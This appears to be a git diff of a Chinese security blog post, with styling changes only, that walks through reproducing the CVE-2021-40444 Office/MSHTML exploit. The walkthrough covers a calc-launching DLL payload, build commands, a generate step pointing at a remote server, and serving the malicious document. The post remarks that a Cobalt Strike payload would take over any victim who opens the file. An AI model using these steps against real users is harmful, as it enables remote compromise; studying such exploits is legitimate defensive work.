@@ -12,7 +12,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <meta name="theme-color" content="#872e30">
+  <meta name="theme-color" content="#2f4154">
   <meta name="description" content="">
   <meta name="author" content="Z3rg">
   <meta name="keywords" content="">
@@ -83,7 +83,7 @@
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand" href="/">
-      <strong>/// Hacklog</strong>
+      <strong>root@Hacklog:~$</strong>
     </a>
 
     <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
@@ -163,7 +163,7 @@
 </nav>
 
     <div class="banner" id="banner" parallax=true
-         style="background: url('https://s3.bmp.ovh/imgs/2021/11/f61959033dd49bcb.gif') no-repeat center center;
+         style="background: url('/img/default.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -247,22 +247,22 @@
 <ul>
 <li><a target="_blank" rel="noopener" href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install lcab<br>sudo apt-get install mingw-w64<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo apt-get install lcab<br>sudo apt-get install mingw-w64<br></code></pre></div></td></tr></table></figure>
 
 <p>安装好lcab和编译环境</p>
 <p>制作我们自己想要的dll文件，创建.c文件将想要的payload放进去，比如想要CS上线就把就用CS的payload，我们直接用官方自带的弹计算器的payload。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">exec</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>	system(<span class="hljs-string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>);<br>	<span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    HINSTANCE hinstDLL,</span></span><br><span class="hljs-params"><span class="hljs-function">    DWORD fdwReason, </span></span><br><span class="hljs-params"><span class="hljs-function">    LPVOID lpReserved )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span>( fdwReason ) <br>    &#123; <br>        <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>           exec(); <br>           <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">exec</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>	system(<span class="hljs-string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>);<br>	<span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    HINSTANCE hinstDLL,</span></span><br><span class="hljs-params"><span class="hljs-function">    DWORD fdwReason, </span></span><br><span class="hljs-params"><span class="hljs-function">    LPVOID lpReserved )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span>( fdwReason ) <br>    &#123; <br>        <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>           exec(); <br>           <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="/posts/lsqwreoxckl/1.png" srcset="/img/loading.gif" lazyload></p>
 <p>然后把他编译为dll文件，并放入test目录</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">i686-w64-mingw32-gcc -shared x.c -o x.dll<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">i686-w64-mingw32-gcc -shared x.c -o x.dll<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="/posts/lsqwreoxckl/2.png" srcset="/img/loading.gif" lazyload></p>
 <p>接下来就运行exploit文件来生成携有恶意JS的html以及cab文件</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 exploit.py generate test/x.dll http://xx.xx.xx.xx #存payload的dll与公网服务器地址<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">python3 exploit.py generate test/x.dll http://xx.xx.xx.xx #存payload的dll与公网服务器地址<br></code></pre></div></td></tr></table></figure>
 
 <p>进入/src开启web服务</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m http.server 80<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">python3 -m http.server 80<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="/posts/lsqwreoxckl/3.png" srcset="/img/loading.gif" lazyload></p>
 <p>再把out目录下生成的或者我们自己添加对象了的恶意word文件在windows打开就可以顺利弹一个计算器出来。如果payload放的是cs的powershell那就直接上线了，对方只要打开word就直接被拿下。</p>
